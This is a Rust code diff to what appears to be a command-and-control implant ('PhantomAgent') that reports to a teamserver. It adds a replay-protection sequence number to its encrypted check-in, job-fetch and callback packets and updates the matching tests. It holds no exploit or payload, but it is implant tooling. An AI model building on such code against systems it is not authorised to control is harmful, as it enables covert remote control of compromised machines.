@@ -34,6 +34,11 @@ pub struct PhantomAgent {
     /// Both encrypt (send) and decrypt (recv) operations use and advance this
     /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
     ctr_offset: u64,
+    /// Monotonic sequence counter for server-side replay protection.
+    ///
+    /// Prepended as 8 LE bytes to every callback payload before encryption.
+    /// Starts at 1; the teamserver rejects any callback with seq ≤ last_seen_seq.
+    callback_seq: u64,
     state: PhantomState,
 }
 
@@ -59,6 +64,7 @@ impl PhantomAgent {
             config,
             transport,
             ctr_offset: 0,
+            callback_seq: 1,
             state: PhantomState::default(),
         })
     }
@@ -75,6 +81,13 @@ impl PhantomAgent {
     #[cfg_attr(not(test), allow(dead_code))]
     pub fn ctr_offset(&self) -> u64 {
         self.ctr_offset
+    }
+
+    /// Return the next sequence number that will be used in the next callback packet.
+    #[must_use]
+    #[cfg_attr(not(test), allow(dead_code))]
+    pub fn callback_seq(&self) -> u64 {
+        self.callback_seq
     }
 
     /// Return the current configured sleep delay in milliseconds.
@@ -138,12 +151,14 @@ impl PhantomAgent {
             self.agent_id,
             &self.session_crypto,
             self.ctr_offset,
+            self.callback_seq,
             u32::from(DemonCommand::CommandCheckin),
             0,
             &[],
         )?;
         let _response = self.transport.send(&packet).await?;
         self.ctr_offset += callback_ctr_blocks(0);
+        self.callback_seq += 1;
 
         // Fetch queued tasks with a separate COMMAND_GET_JOB request.
         let packages = self.get_job().await?;
@@ -157,12 +172,14 @@ impl PhantomAgent {
                     self.agent_id,
                     &self.session_crypto,
                     self.ctr_offset,
+                    self.callback_seq,
                     callback.command_id(),
                     callback.request_id(),
                     &payload,
                 )?;
                 self.send_packet(packet).await?;
                 self.ctr_offset += callback_ctr_blocks(payload.len());
+                self.callback_seq += 1;
                 if matches!(callback, PendingCallback::Exit { .. }) {
                     exit_requested = true;
                 }
@@ -182,6 +199,7 @@ impl PhantomAgent {
             self.agent_id,
             &self.session_crypto,
             self.ctr_offset,
+            self.callback_seq,
             u32::from(DemonCommand::CommandGetJob),
             0,
             &[],
@@ -189,6 +207,7 @@ impl PhantomAgent {
 
         let response = self.transport.send(&packet).await?;
         self.ctr_offset += callback_ctr_blocks(0);
+        self.callback_seq += 1;
 
         let (packages, next_offset) =
             parse_job_response(&self.session_crypto, self.ctr_offset, &response)?;
@@ -277,12 +296,14 @@ impl PhantomAgent {
                 self.agent_id,
                 &self.session_crypto,
                 self.ctr_offset,
+                self.callback_seq,
                 callback.command_id(),
                 callback.request_id(),
                 &payload,
             )?;
             self.send_packet(packet).await?;
             self.ctr_offset += callback_ctr_blocks(payload.len());
+            self.callback_seq += 1;
         }
 
         Ok(())
@@ -470,6 +491,13 @@ mod tests {
     fn agent_creation_succeeds() -> Result<(), Box<dyn Error>> {
         let agent = PhantomAgent::new(PhantomConfig::default())?;
         assert_ne!(agent.agent_id(), 0);
+        Ok(())
+    }
+
+    #[test]
+    fn callback_seq_starts_at_one() -> Result<(), Box<dyn Error>> {
+        let agent = PhantomAgent::new(PhantomConfig::default())?;
+        assert_eq!(agent.callback_seq(), 1);
         Ok(())
     }
 
@@ -762,14 +790,18 @@ mod tests {
         // command_id and request_id are in the clear.
         assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandCheckin).to_be_bytes());
         assert_eq!(&envelope.payload[4..8], &0_u32.to_be_bytes());
-        // Remaining bytes are encrypted: payload_len(4) only (empty checkin payload).
+        // Remaining bytes are encrypted: seq_num(8 LE) + payload_len(4) only (empty checkin payload).
         let decrypted = decrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
             checkin_encrypt_offset,
             &envelope.payload[8..],
         )?;
-        assert_eq!(&decrypted[..4], &0_u32.to_be_bytes());
+        // seq_num starts at 1; checkin is the first callback sent after init.
+        let decoded_seq = u64::from_le_bytes(decrypted[..8].try_into()?);
+        assert_eq!(decoded_seq, 1_u64);
+        // payload_len at offset 8 must be 0 (empty checkin body).
+        assert_eq!(&decrypted[8..12], &0_u32.to_be_bytes());
         let expected_final_offset = after_task_decrypt + callback_ctr_blocks(4); // 5
         assert_eq!(agent.ctr_offset, expected_final_offset);
 
@@ -852,14 +884,18 @@ mod tests {
         // command_id and request_id are in the clear.
         assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandCheckin).to_be_bytes());
         assert_eq!(&envelope.payload[4..8], &0_u32.to_be_bytes());
-        // Remaining bytes are encrypted: payload_len(4) only (empty checkin payload).
+        // Remaining bytes are encrypted: seq_num(8 LE) + payload_len(4) only (empty checkin payload).
         let decrypted = decrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
             1, // checkin encrypted at ctr_offset=1 (after init ack)
             &envelope.payload[8..],
         )?;
-        assert_eq!(&decrypted[..4], &0_u32.to_be_bytes());
+        // seq_num = 1 (first callback after init).
+        let decoded_seq = u64::from_le_bytes(decrypted[..8].try_into()?);
+        assert_eq!(decoded_seq, 1_u64);
+        // payload_len at offset 8 must be 0 (empty checkin body).
+        assert_eq!(&decrypted[8..12], &0_u32.to_be_bytes());
 
         let _get_job_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
         let exit_callback_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
